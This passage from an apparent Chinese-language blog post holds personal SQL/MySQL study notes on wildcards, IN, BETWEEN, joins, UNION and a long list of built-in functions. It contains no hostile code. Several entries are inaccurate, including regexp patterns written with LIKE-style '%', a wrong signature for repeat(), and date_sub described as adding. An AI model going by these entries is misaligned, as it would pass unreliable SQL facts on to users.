<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">like</span> <span class="hljs-keyword">pattern</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%g&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;g%&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%g%&#x27;</span><br># <span class="hljs-keyword">not</span> 关键字 不包含<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%g%&#x27;</span><br></code></pre></td></tr></table></figure>

<p>%可以用来定义通配符(模式中缺少的字母)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-07-09.png" alt="like关键字查询" class="lazyload"></p>
<p><strong>通配符</strong><br>在搜索数据库中的数据时，sql通配符可以代替一个或多个字符。sql通配符必须和like运算符一起使用。[]通配符需要使用regexp关键字<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-08-47.png" alt="通配符" class="lazyload"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">#使用_通配符 仅代替一个字符<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;_g&#x27;</span><br>#使用[charlist]通配符 字符列中的任何单一字符<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content regexp <span class="hljs-string">&#x27;[ds]%&#x27;</span> <span class="hljs-comment">--包含</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> message <span class="hljs-keyword">where</span> content regexp <span class="hljs-string">&#x27;[!g]%&#x27;</span> <span class="hljs-comment">--不包含</span><br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-28-04.png" alt="通配符" class="lazyload"></p>
<p><strong>IN操作符</strong><br>in操作符允许我们在where子句中规定多个值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">in</span> (value1,value2,...)<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-32-06.png" alt="测试in操作符" class="lazyload"></p>
<p><strong>not in 与 null 之间的关系</strong><br>A not in B的原理是拿A表值与B表值做是否不等的比较, 也就是a != b. 在sql中, null是缺失未知值而不是空值<br>当你判断任意值a != null时, 官方说, “You cannot use arithmetic comparison operators such as =, &lt;, or &lt;&gt; to test for NULL”, 任何与null值的对比都将返回null. 因此返回结果为否,这点可以用代码 select if(1 = null, ‘true’, ‘false’)证实.<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-37-07.png" alt="测试" class="lazyload"></p>
<p><strong>BETWEEN操作符</strong><br>操作符between…and会选取介于两个值之间的数据范围，这些值可以是数值、文本或者日期</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段名 <span class="hljs-keyword">between</span> value1 <span class="hljs-keyword">and</span> value2 <br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-43-31.png" alt="between  and " class="lazyload"></p>
<p><em>注意：</em>不同的数据库对这个操作符的处理方式是有差异的。所以使用时要检查数据库如何处理操作符（左闭右开or全开or左开右闭or全闭）</p>
<p><strong>alias（别名）</strong><br>通过使用alias可以为列名和表名指定别名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">表的alias语法<br><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">as</span> 别名<br>列的alias语法<br><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">as</span> 别名 <span class="hljs-keyword">from</span> 表名<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-18-51-34.png" alt="别名" class="lazyload"></p>
<p><strong>JOIN</strong><br>join用于根据两个或多个表中间的列的关系从这些表中查询数据如果表中至少一个匹配则返回行<br><strong>inner join内连接</strong><br>在表中存在至少一个匹配时，则返回行。inner join 和join是相同的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> 表名<span class="hljs-number">2</span> <span class="hljs-keyword">on</span> 表名<span class="hljs-number">1.</span>字段名<span class="hljs-operator">=</span>表名<span class="hljs-number">2.</span>字段名<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-20-53-52.png" alt="join" class="lazyload"></p>
<p><strong>left join/left outer join左连接</strong><br>即使右表中没有匹配也从左表返回所有的行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> 表名<span class="hljs-number">2</span> <span class="hljs-keyword">on</span> 表名<span class="hljs-number">1.</span>字段名<span class="hljs-operator">=</span>表名<span class="hljs-number">2.</span>字段名<br></code></pre></td></tr></table></figure>

<p><strong>right join / right outer join右连接</strong><br>即使左表中没有匹配，也从右表返回所有行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">join</span> 表名<span class="hljs-number">2</span> <span class="hljs-keyword">on</span> 表名<span class="hljs-number">1.</span>字段名<span class="hljs-operator">=</span>表名<span class="hljs-number">2.</span>字段名<br></code></pre></td></tr></table></figure>

<p><strong>full join/full outer join全连接</strong><br>只要其中一个表存在匹配就返回行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">full</span> <span class="hljs-keyword">join</span> 表名<span class="hljs-number">2</span> <span class="hljs-keyword">on</span> 表名<span class="hljs-number">1.</span>字段名<span class="hljs-operator">=</span>表名<span class="hljs-number">2.</span>字段名<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-21-10-23.png" alt="join" class="lazyload"></p>
<p><strong>union操作符</strong><br>union操作符用于<em>合并</em>两个或多个select语句的结果集。union内部的select语句<em>必须拥有相同数量的列</em>。列也必须<em>拥有相似的数据类型</em>。同时每一条select语句中的列的<em>顺序必须相同</em>。union操作符<em>默认选取不同</em>的值。如果<em>允许重复</em>的值，请使用<em>union all</em>。<br>union结果集中的列名总是等于union中第一个select语句中的列名。<br>行专列用groupby+sumif列转行用unionn all</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span>语法 <span class="hljs-comment">--union命令只会选取不同的值</span><br><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">2</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span>语法<br><span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> 字段名 <span class="hljs-keyword">from</span> 表名<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-20-34-55.png" alt="union" class="lazyload"></p>
<h2 id="数据库的一些函数"><a href="#数据库的一些函数" class="headerlink" title="数据库的一些函数"></a>数据库的一些函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">一、数学函数<br><span class="hljs-built_in">abs</span>(x) 返回x的绝对值<br>bin(x) 返回x的二进制（oct返回八进制，hex返回十六进制）<br><span class="hljs-built_in">ceiling</span>(x) 返回大于x的最小整数值<br><span class="hljs-built_in">exp</span>(x) 返回值e（自然对数的底）的x次方<br><span class="hljs-built_in">floor</span>(x) 返回小于x的最大整数值<br>greatest(x1,x2,...,xn)返回集合中最大的值<br>least(x1,x2,...,xn) 返回集合中最小的值<br><span class="hljs-built_in">ln</span>(x) 返回x的自然对数<br><span class="hljs-built_in">log</span>(x,y)返回x的以y为底的对数<br><span class="hljs-built_in">mod</span>(x,y) 返回x<span class="hljs-operator">/</span>y的模（余数）<br>pi()返回pi的值（圆周率）<br>rand()返回０到１内的随机值,可以通过提供一个参数(种子)使rand()随机数生成器生成一个指定的值。<br>round(x,y)返回参数x的四舍五入的有y位小数的值<br>sign(x) 返回代表数字x的符号的值<br><span class="hljs-built_in">sqrt</span>(x) 返回一个数的平方根<br><span class="hljs-keyword">truncate</span>(x,y) 返回数字x截短为y位小数的结果<br> <br>二、聚合函数(常用于<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>从句的<span class="hljs-keyword">select</span>查询中)<br><span class="hljs-built_in">avg</span>(col)返回指定列的平均值<br><span class="hljs-built_in">count</span>(col)返回指定列中非<span class="hljs-keyword">null</span>值的个数<br><span class="hljs-built_in">min</span>(col)返回指定列的最小值<br><span class="hljs-built_in">max</span>(col)返回指定列的最大值<br><span class="hljs-built_in">sum</span>(col)返回指定列的所有值之和<br>group_concat(col) 返回由属于一组的列值连接组合而成的结果<br> <br>三、字符串函数<br>ascii(<span class="hljs-type">char</span>)返回字符的ascii码值<br>bit_length(str)返回字符串的比特长度<br>concat(s1,s2...,sn)将s1,s2...,sn连接成字符串<br>concat_ws(sep,s1,s2...,sn)将s1,s2...,sn连接成字符串，并用sep字符间隔<br><span class="hljs-keyword">insert</span>(str,x,y,instr) 将字符串str从第x位置开始，y个字符长的子串替换为字符串instr，返回结果<br>find_in_set(str,list)分析逗号分隔的list列表，如果发现str，返回str在list中的位置<br>lcase(str)或<span class="hljs-built_in">lower</span>(str) 返回将字符串str中所有字符改变为小写后的结果<br><span class="hljs-keyword">left</span>(str,x)返回字符串str中最左边的x个字符<br>length(s)返回字符串str中的字符数<br>ltrim(str) 从字符串str中切掉开头的空格<br><span class="hljs-built_in">position</span>(substr <span class="hljs-keyword">in</span> str) 返回子串substr在字符串str中第一次出现的位置<br>quote(str) 用反斜杠转义str中的单引号<br>repeat(str,srchstr,rplcstr)返回字符串str重复x次的结果<br>reverse(str) 返回颠倒字符串str的结果<br><span class="hljs-keyword">right</span>(str,x) 返回字符串str中最右边的x个字符<br>rtrim(str) 返回字符串str尾部的空格<br>strcmp(s1,s2)比较字符串s1和s2<br><span class="hljs-built_in">trim</span>(str)去除字符串首部和尾部的所有空格<br>ucase(str)或<span class="hljs-built_in">upper</span>(str) 返回将字符串str中所有字符转变为大写后的结果<br> <br>四、日期和时间函数<br>curdate()或<span class="hljs-built_in">current_date</span>() 返回当前的日期<br>curtime()或<span class="hljs-built_in">current_time</span>() 返回当前的时间<br>date_add(<span class="hljs-type">date</span>,<span class="hljs-type">interval</span> <span class="hljs-type">int</span> keyword)返回日期<span class="hljs-type">date</span>加上间隔时间<span class="hljs-type">int</span>的结果(<span class="hljs-type">int</span>必须按照关键字进行格式化),如：selectdate_add(<span class="hljs-built_in">current_date</span>,<span class="hljs-type">interval</span> <span class="hljs-number">6</span> <span class="hljs-keyword">month</span>);<br>date_format(<span class="hljs-type">date</span>,fmt) 依照指定的fmt格式格式化日期<span class="hljs-type">date</span>值<br>date_sub(<span class="hljs-type">date</span>,<span class="hljs-type">interval</span> <span class="hljs-type">int</span> keyword)返回日期<span class="hljs-type">date</span>加上间隔时间<span class="hljs-type">int</span>的结果(<span class="hljs-type">int</span>必须按照关键字进行格式化),如：selectdate_sub(<span class="hljs-built_in">current_date</span>,<span class="hljs-type">interval</span> <span class="hljs-number">6</span> <span class="hljs-keyword">month</span>);<br>dayofweek(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>所代表的一星期中的第几天(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">7</span>)<br>dayofmonth(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>是一个月的第几天(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">31</span>)<br>dayofyear(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>是一年的第几天(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">366</span>)<br>dayname(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>的星期名，如：<span class="hljs-keyword">select</span> dayname(<span class="hljs-built_in">current_date</span>);<br>from_unixtime(ts,fmt) 根据指定的fmt格式，格式化unix时间戳ts<br><span class="hljs-keyword">hour</span>(<span class="hljs-type">time</span>) 返回<span class="hljs-type">time</span>的小时值(<span class="hljs-number">0</span><span class="hljs-operator">~</span><span class="hljs-number">23</span>)<br><span class="hljs-keyword">minute</span>(<span class="hljs-type">time</span>) 返回<span class="hljs-type">time</span>的分钟值(<span class="hljs-number">0</span><span class="hljs-operator">~</span><span class="hljs-number">59</span>)<br><span class="hljs-keyword">month</span>(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>的月份值(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">12</span>)<br>monthname(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>的月份名，如：<span class="hljs-keyword">select</span> monthname(<span class="hljs-built_in">current_date</span>);<br>now() 返回当前的日期和时间<br>quarter(<span class="hljs-type">date</span>) 返回<span class="hljs-type">date</span>在一年中的季度(<span class="hljs-number">1</span><span class="hljs-operator">~</span><span class="hljs-number">4</span>)，如<span class="hljs-keyword">select</span> quarter(<span class="hljs-built_in">current_date</span>);<br>week(<span class="hljs-type">date</span>) 返回日期<span class="hljs-type">date</span>为一年中第几周(<span class="hljs-number">0</span><span class="hljs-operator">~</span><span class="hljs-number">53</span>)<br><span class="hljs-keyword">year</span>(<span class="hljs-type">date</span>) 返回日期<span class="hljs-type">date</span>的年份(<span class="hljs-number">1000</span><span class="hljs-operator">~</span><span class="hljs-number">9999</span>)<br>一些示例：<br>获取当前系统时间：<span class="hljs-keyword">select</span> from_unixtime(unix_timestamp());<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">extract</span>(year_month <span class="hljs-keyword">from</span> <span class="hljs-built_in">current_date</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">extract</span>(day_second <span class="hljs-keyword">from</span> <span class="hljs-built_in">current_date</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">extract</span>(hour_minute <span class="hljs-keyword">from</span> <span class="hljs-built_in">current_date</span>);<br>返回两个日期值之间的差值(月数)：<span class="hljs-keyword">select</span> period_diff(<span class="hljs-number">200302</span>,<span class="hljs-number">199802</span>);<br>在mysql中计算年龄：<br><span class="hljs-keyword">select</span> date_format(from_days(to_days(now())<span class="hljs-operator">-</span>to_days(birthday)),<span class="hljs-string">&#x27;%y&#x27;</span>)<span class="hljs-operator">+</span><span class="hljs-number">0</span> <span class="hljs-keyword">as</span> age <span class="hljs-keyword">from</span> employee;<br>这样，如果brithday是未来的年月日的话，计算结果为<span class="hljs-number">0</span>。<br>下面的<span class="hljs-keyword">sql</span>语句计算员工的绝对年龄，即当birthday是未来的日期时，将得到负值。<br><span class="hljs-keyword">select</span> date_format(now(), <span class="hljs-string">&#x27;%y&#x27;</span>) <span class="hljs-operator">-</span> date_format(birthday, <span class="hljs-string">&#x27;%y&#x27;</span>) <span class="hljs-operator">-</span>(date_format(now(), <span class="hljs-string">&#x27;00-%m-%d&#x27;</span>) <span class="hljs-operator">&lt;</span>date_format(birthday, <span class="hljs-string">&#x27;00-%m-%d&#x27;</span>)) <span class="hljs-keyword">as</span> age <span class="hljs-keyword">from</span> employee<br> <br>五、加密函数<br>aes_encrypt(str,key) 返回用密钥key对字符串str利用高级加密标准算法加密后的结果，调用aes_encrypt的结果是一个二进制字符串，以<span class="hljs-type">blob</span>类型存储<br>aes_decrypt(str,key) 返回用密钥key对字符串str利用高级加密标准算法解密后的结果<br>decode(str,key) 使用key作为密钥解密加密字符串str<br>encrypt(str,salt) 使用unixcrypt()函数，用关键词salt(一个可以惟一确定口令的字符串，就像钥匙一样)加密字符串str<br>encode(str,key) 使用key作为密钥加密字符串str，调用encode()的结果是一个二进制字符串，它以<span class="hljs-type">blob</span>类型存储<br>md5() 计算字符串str的md5校验和<br>password(str) 返回字符串str的加密版本，这个加密过程是不可逆转的，和unix密码加密过程使用不同的算法。<br>sha() 计算字符串str的安全散列算法(sha)校验和<br>示例：<br><span class="hljs-keyword">select</span> encrypt(<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;salt&#x27;</span>);<br><span class="hljs-keyword">select</span> encode(<span class="hljs-string">&#x27;xufeng&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">select</span> decode(encode(<span class="hljs-string">&#x27;xufeng&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>),<span class="hljs-string">&#x27;key&#x27;</span>);#加解密放在一起<br><span class="hljs-keyword">select</span> aes_encrypt(<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">select</span> aes_decrypt(aes_encrypt(<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>),<span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">select</span> md5(<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-keyword">select</span> sha(<span class="hljs-string">&#x27;123456&#x27;</span>);<br> <br>六、控制流函数<br>mysql有<span class="hljs-number">4</span>个函数是用来进行条件操作的，这些函数可以实现<span class="hljs-keyword">sql</span>的条件逻辑，允许开发者将一些应用程序业务逻辑转换到数据库后台。<br>mysql控制流函数：<br><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span>[test1] <span class="hljs-keyword">then</span> [result1]...<span class="hljs-keyword">else</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">end</span>如果testn是真，则返回resultn，否则返回<span class="hljs-keyword">default</span><br><span class="hljs-keyword">case</span> [test] <span class="hljs-keyword">when</span>[val1] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span>]...<span class="hljs-keyword">else</span> [<span class="hljs-keyword">default</span>]<span class="hljs-keyword">end</span> 如果test和valn相等，则返回resultn，否则返回<span class="hljs-keyword">default</span><br>if(test,t,f) 如果test是真，返回t；否则返回f<br>ifnull(arg1,arg2) 如果arg1不是空，返回arg1，否则返回arg2<br><span class="hljs-built_in">nullif</span>(arg1,arg2) 如果arg1<span class="hljs-operator">=</span>arg2返回<span class="hljs-keyword">null</span>；否则返回arg1<br>这些函数的第一个是ifnull()，它有两个参数，并且对第一个参数进行判断。如果第一个参数不是<span class="hljs-keyword">null</span>，函数就会向调用者返回第一个参数；如果是<span class="hljs-keyword">null</span>,将返回第二个参数。<br>如：<span class="hljs-keyword">select</span> ifnull(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>), ifnull(<span class="hljs-keyword">null</span>,<span class="hljs-number">10</span>),ifnull(<span class="hljs-number">4</span><span class="hljs-operator">*</span><span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;false&#x27;</span>);<br><span class="hljs-built_in">nullif</span>()函数将会检验提供的两个参数是否相等，如果相等，则返回<span class="hljs-keyword">null</span>，如果不相等，就返回第一个参数。<br>如：<span class="hljs-keyword">select</span> <span class="hljs-built_in">nullif</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">nullif</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>),<span class="hljs-built_in">nullif</span>(<span class="hljs-number">2</span><span class="hljs-operator">+</span><span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>);<br>和许多脚本语言提供的if()函数一样，mysql的if()函数也可以建立一个简单的条件测试，这个函数有三个参数，第一个是要被判断的表达式，如果表达式为真，if()将会返回第二个参数，如果为假，if()将会返回第三个参数。<br>如：selectif(<span class="hljs-number">1</span><span class="hljs-operator">&lt;</span><span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>),if(<span class="hljs-number">56</span><span class="hljs-operator">&gt;</span><span class="hljs-number">100</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;false&#x27;</span>);<br>if()函数在只有两种可能结果时才适合使用。然而，在现实世界中，我们可能发现在条件测试中会需要多个分支。在这种情况下，mysql提供了<span class="hljs-keyword">case</span>函数，它和php及perl语言的switch<span class="hljs-operator">-</span><span class="hljs-keyword">case</span>条件例程一样。<br><span class="hljs-keyword">case</span>函数的格式有些复杂，通常如下所示：<br><span class="hljs-keyword">case</span> [expression <span class="hljs-keyword">to</span> be evaluated]<br><span class="hljs-keyword">when</span> [val <span class="hljs-number">1</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">1</span>]<br><span class="hljs-keyword">when</span> [val <span class="hljs-number">2</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">2</span>]<br><span class="hljs-keyword">when</span> [val <span class="hljs-number">3</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">3</span>]<br>......<br><span class="hljs-keyword">when</span> [val n] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> n]<br><span class="hljs-keyword">else</span> [<span class="hljs-keyword">default</span> <span class="hljs-keyword">result</span>]<br><span class="hljs-keyword">end</span><br>这里，第一个参数是要被判断的值或表达式，接下来的是一系列的<span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">then</span>块，每一块的第一个参数指定要比较的值，如果为真，就返回结果。所有的<span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">then</span>块将以<span class="hljs-keyword">else</span>块结束，当<span class="hljs-keyword">end</span>结束了所有外部的<span class="hljs-keyword">case</span>块时，如果前面的每一个块都不匹配就会返回<span class="hljs-keyword">else</span>块指定的默认结果。如果没有指定<span class="hljs-keyword">else</span>块，而且所有的<span class="hljs-keyword">when</span><span class="hljs-operator">-</span><span class="hljs-keyword">then</span>比较都不是真，mysql将会返回<span class="hljs-keyword">null</span>。<br><span class="hljs-keyword">case</span>函数还有另外一种句法，有时使用起来非常方便，如下：<br><span class="hljs-keyword">case</span><br><span class="hljs-keyword">when</span> [conditional test <span class="hljs-number">1</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">1</span>]<br><span class="hljs-keyword">when</span> [conditional test <span class="hljs-number">2</span>] <span class="hljs-keyword">then</span> [<span class="hljs-keyword">result</span> <span class="hljs-number">2</span>]<br><span class="hljs-keyword">else</span> [<span class="hljs-keyword">default</span> <span class="hljs-keyword">result</span>]<br><span class="hljs-keyword">end</span><br>这种条件下，返回的结果取决于相应的条件测试是否为真。<br>示例：<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;green&#x27;</span><br><span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;red&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;stop&#x27;</span><br><span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;green&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;go&#x27;</span> <span class="hljs-keyword">end</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-number">9</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-number">2</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;n/a&#x27;</span> <span class="hljs-keyword">end</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-number">2</span><span class="hljs-operator">+</span><span class="hljs-number">2</span>)<span class="hljs-operator">=</span><span class="hljs-number">4</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;ok&#x27;</span> <span class="hljs-keyword">when</span>(<span class="hljs-number">2</span><span class="hljs-operator">+</span><span class="hljs-number">2</span>)<span class="hljs-operator">&lt;&gt;</span><span class="hljs-number">4</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;not ok&#x27;</span> <span class="hljs-keyword">end</span> asstatus;<br><span class="hljs-keyword">select</span> name,if((isactive <span class="hljs-operator">=</span> <span class="hljs-number">1</span>),<span class="hljs-string">&#x27;已激活&#x27;</span>,<span class="hljs-string">&#x27;未激活&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">result</span> fromuserlogininfo;<br><span class="hljs-keyword">select</span> fname,lname,(math<span class="hljs-operator">+</span>sci<span class="hljs-operator">+</span>lit) <span class="hljs-keyword">as</span> total,<br><span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (math<span class="hljs-operator">+</span>sci<span class="hljs-operator">+</span>lit) <span class="hljs-operator">&lt;</span> <span class="hljs-number">50</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;d&#x27;</span><br><span class="hljs-keyword">when</span> (math<span class="hljs-operator">+</span>sci<span class="hljs-operator">+</span>lit) <span class="hljs-keyword">between</span> <span class="hljs-number">50</span> <span class="hljs-keyword">and</span> <span class="hljs-number">150</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;c&#x27;</span><br><span class="hljs-keyword">when</span> (math<span class="hljs-operator">+</span>sci<span class="hljs-operator">+</span>lit) <span class="hljs-keyword">between</span> <span class="hljs-number">151</span> <span class="hljs-keyword">and</span> <span class="hljs-number">250</span> <span class="hljs-keyword">then</span> <span class="hljs-string">&#x27;b&#x27;</span><br><span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">as</span> grade <span class="hljs-keyword">from</span> marks;<br><span class="hljs-keyword">select</span> if(encrypt(<span class="hljs-string">&#x27;sue&#x27;</span>,<span class="hljs-string">&#x27;ts&#x27;</span>)<span class="hljs-operator">=</span>upass,<span class="hljs-string">&#x27;allow&#x27;</span>,<span class="hljs-string">&#x27;deny&#x27;</span>) <span class="hljs-keyword">as</span> loginresultfrom users <span class="hljs-keyword">where</span> uname <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;sue&#x27;</span>;#一个登陆验证<br> <br>七、格式化函数<br>date_format(<span class="hljs-type">date</span>,fmt) 依照字符串fmt格式化日期<span class="hljs-type">date</span>值<br>format(x,y) 把x格式化为以逗号隔开的数字序列，y是结果的小数位数<br>inet_aton(ip) 返回ip地址的数字表示<br>inet_ntoa(num) 返回数字所代表的ip地址<br>time_format(<span class="hljs-type">time</span>,fmt) 依照字符串fmt格式化时间<span class="hljs-type">time</span>值<br>其中最简单的是format()函数，它可以把大的数值格式化为以逗号间隔的易读的序列。<br>示例：<br><span class="hljs-keyword">select</span> format(<span class="hljs-number">34234.34323432</span>,<span class="hljs-number">3</span>);<br><span class="hljs-keyword">select</span> date_format(now(),<span class="hljs-string">&#x27;%w,%d %m %y %r&#x27;</span>);<br><span class="hljs-keyword">select</span> date_format(now(),<span class="hljs-string">&#x27;%y-%m-%d&#x27;</span>);<br><span class="hljs-keyword">select</span> date_format(<span class="hljs-number">19990330</span>,<span class="hljs-string">&#x27;%y-%m-%d&#x27;</span>);<br><span class="hljs-keyword">select</span> date_format(now(),<span class="hljs-string">&#x27;%h:%i %p&#x27;</span>);<br><span class="hljs-keyword">select</span> inet_aton(<span 